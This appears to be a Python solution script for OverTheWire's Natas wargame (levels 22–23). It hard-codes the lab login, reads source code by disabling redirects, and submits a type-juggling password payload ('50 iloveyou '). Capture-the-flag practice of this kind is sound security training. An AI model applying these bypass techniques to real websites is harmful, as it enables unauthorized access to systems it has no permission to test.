#! /usr/bin/env python

import requests
import re

usn = 'natas23'
url = 'http://%s.natas.labs.overthewire.org/?revelio=1' % usn
passwd = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
login = (usn, passwd)

request = requests.Session()
def get_source_code():
  connection = request.get(url, auth=login, allow_redirects = False)
  pageContent = connection.text
  print pageContent;


def solve_lab():
  connection = request.post(url, data = {"passwd":"50 iloveyou "}, auth = login)
  pageContent = connection.text 
  print pageContent